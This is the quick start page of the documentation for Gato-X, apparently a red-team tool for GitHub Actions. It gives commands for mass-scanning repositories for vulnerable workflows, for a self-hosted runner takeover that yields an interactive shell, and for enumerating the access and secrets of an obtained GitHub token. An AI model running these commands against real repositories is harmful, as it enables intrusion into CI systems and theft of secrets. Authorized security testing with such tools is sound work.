# Quick Start Guide

This guide will help you get started with Gato-X quickly for common use cases.

## Prerequisites

Before you begin, make sure you have:

1. Installed Gato-X (see [Installation](user-guide/installation.md))
2. Created a GitHub PAT with appropriate scopes
3. Set the `GH_TOKEN` environment variable with your PAT

## Search For GitHub Actions Vulnerabilities at Scale

This workflow demonstrates how to scan a large number of repositories for potential vulnerabilities:

### Step 1: Search for candidate repositories

```bash
gato-x s -sg -q 'count:75000 /(issue_comment|pull_request_target|issues:)/ file:.github/workflows/ lang:yaml' -oT checks.txt
```

This command:
- Uses the search (`s`) command with Sourcegraph API (`-sg`)
- Searches for workflows that use potentially vulnerable triggers
- Outputs the results to a text file (`checks.txt`)

### Step 2: Enumerate the repositories for vulnerabilities

```bash
gato-x e -R checks.txt | tee gatox_output.txt
```

This command:
- Uses the enumerate (`e`) command
- Processes all repositories from the file (`-R checks.txt`)
- Saves the output to a file while displaying it in the terminal

## Perform Self-Hosted Runner Takeover

To perform a public repository self-hosted runner takeover attack:

### Prerequisites

- A GitHub PAT with `repo`, `workflow`, and `gist` scopes
- The PAT should be for an account that is a contributor to the target repository

### Execute the attack

```bash
gato-x a --runner-on-runner --target ORG/REPO --target-os linux --target-arch x64
```

This command:
- Uses the attack (`a`) command
- Specifies the runner-on-runner attack method
- Targets a specific repository
- Specifies the target runner's OS and architecture

If the attack succeeds, Gato-X will drop to an interactive prompt where you can execute shell commands on the self-hosted runner.

For non-ephemeral runners, use the `--keep-alive` flag to keep the workflow running (up to 5 days).

## Post-Compromise Enumeration

If you have obtained a GitHub PAT, you can use Gato-X to validate it and identify what it has access to:

```bash
gato-x e -s
```

This command:
- Uses the enumerate (`e`) command with self-enumeration (`-s`)
- Identifies repositories with administrative access
- Shows accessible secrets (if the user has write access)

## Additional Options

For more detailed information about each command and its options, see the [Command Reference](user-guide/command-reference/index.md) section.
